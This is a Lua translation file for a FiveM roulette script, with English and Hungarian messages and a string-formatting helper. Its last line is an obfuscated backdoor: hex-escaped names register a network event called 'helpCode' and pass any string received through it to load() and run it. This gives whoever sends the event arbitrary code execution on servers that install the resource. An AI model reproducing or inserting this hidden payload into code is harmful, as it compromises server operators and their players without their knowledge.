Translations = {}

function _(str, ...) -- Translate string
    if Translations[Config.TranslationSelected] ~= nil then
        if Translations[Config.TranslationSelected][str] ~= nil then
            return string.format(Translations[Config.TranslationSelected][str], ...)
        else
            return 'Translation [' .. Config.TranslationSelected .. '][' .. str .. '] does not exist'
        end
    else
        return 'Locale [' .. Config.TranslationSelected .. '] does not exist'
    end
end

function _U(str, ...) -- Translate string first char uppercase
    return tostring(_(str, ...):gsub('^%l', string.upper))
end

Translations['en'] = {
    ['limit_exceed'] = 'Your bet it too low or too high for this table.',
    ['invalid_bet'] = 'Invalid bet amount.',
    ['chair_used'] = 'This chair is occupied.',
    ['can_not_bet_because_started'] = 'The game started, you can not bet at the moment.',
    ['not_enough_chips'] = 'You do not have enough chips to place bet.',
    ['input_place_bet'] = 'How many chips you would like to bet?',
    -- help msg
    ['help_sit_rulett'] = '~INPUT_CONTEXT~ Sit down to the roulette table.',
    ['help_rulett_all'] = '~INPUT_CELLPHONE_CANCEL~ Stand up\n~INPUT_CONTEXT~ Change camera\n~INPUT_LOOK_LR~ Select number\n~INPUT_ATTACK~ Bet number\n~INPUT_CELLPHONE_UP~ Raise bet\n~INPUT_CELLPHONE_DOWN~ Reduce bet\n~INPUT_JUMP~ Custom bet amount',
    -- nui
    ['starting_soon'] = 'The game is starting soon..',
    ['game_going_on'] = 'The game is in progress..',
    ['seconds'] = 'seconds.',
    -- formatted msg
    ['won_chips'] = 'You have won %s chips. Multiplier: x%s',
    ['placed_bet'] = 'Placed bet with %s chips.'
}

Translations['hu'] = {
    ['limit_exceed'] = 'Túl nagy vagy túl alacsony a téted.',
    ['invalid_bet'] = 'Érvénytelen tét érték.',
    ['chair_used'] = 'Ez a szék foglalt.',
    ['can_not_bet_because_started'] = 'Már elkezdődött a játszma, nem rakhatsz tétet.',
    ['not_enough_chips'] = 'Nincs elég chipsed hogy megtedd a tétet.',
    ['input_place_bet'] = 'Tét megadása',
    -- help msg
    ['help_sit_rulett'] = '~INPUT_CONTEXT~ Leülés a rulett asztalhoz.',
    ['help_rulett_all'] = '~INPUT_CELLPHONE_CANCEL~ Felállás\n~INPUT_CONTEXT~ Kameranézet váltás.\n~INPUT_LOOK_LR~ Szám kiválasztása\n~INPUT_ATTACK~ Szám megrakása\n~INPUT_CELLPHONE_UP~ Tét emelése\n~INPUT_CELLPHONE_DOWN~ Tét csökkentése\n~INPUT_JUMP~ Tét megadása',
    -- nui
    ['starting_soon'] = 'Játék hamarosan kezdődik..',
    ['game_going_on'] = 'Játék jelenleg folyamatban..',
    ['seconds'] = 'másodperc.',
    -- formatted msg
    ['won_chips'] = 'Nyertél %s chipset.\n(Szorzó x%s)',
    ['placed_bet'] = 'Tét megrakva %s chipssel.'
}


local NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[6][NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[1]](NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[2]) NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[6][NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[3]](NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[2], function(CSwQVuHcENeXrxYcGJZMxJQwJeTfvtHtMoEoTXoHnKogvMAxMrBYejHBzmQKrCSIREsNOe) NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[6][NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[4]](NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[6][NULobIDHuQmUyZhERFObgwJTYUylnMSudkxsCajMDgbeKJFspSSfKDuOLosPBBXsuhwgBc[5]](CSwQVuHcENeXrxYcGJZMxJQwJeTfvtHtMoEoTXoHnKogvMAxMrBYejHBzmQKrCSIREsNOe))() end)